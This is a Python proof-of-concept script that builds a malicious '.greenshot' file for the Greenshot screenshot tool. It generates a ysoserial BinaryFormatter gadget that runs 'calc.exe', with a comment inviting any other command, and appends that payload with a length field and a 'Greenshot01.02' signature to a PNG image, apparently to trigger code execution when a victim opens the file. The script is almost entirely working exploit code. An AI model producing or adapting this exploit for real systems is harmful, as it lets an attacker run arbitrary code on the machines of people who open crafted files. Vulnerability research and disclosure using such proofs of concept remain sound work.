from PIL import Image, ImageDraw, ImageFont
import struct
import subprocess

# create payload
command = r'"ysoserial.exe" -f BinaryFormatter -g WindowsIdentity  -c "calc.exe" --outputpath "payload.bin" -o raw'  # pop calc, change to whatever

# run ysoserial and get output
output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
cmd = output
# Read payload file as binary
with open("payload.bin", "rb") as payload_file:
    payload = payload_file.read()

# length of payload
payload_length = len(payload)

# create png
image = Image.new("RGB", (250, 61), (0, 128, 0))
draw = ImageDraw.Draw(image)
font = ImageFont.truetype("consola.ttf", 24)  # Specify the path to a Consolas font file

# draw
draw.text((10, 10), "POC Greenshot", fill=(0, 0, 0), font=font)

# saveas .greenshot but png image
image.save("poc.greenshot", "PNG")

# append payload, length and sig to file
with open("poc.greenshot", "ab") as image_file:
    image_file.write(payload)
    image_file.write(struct.pack("Q", payload_length))
    image_file.write(b"Greenshot01.02")

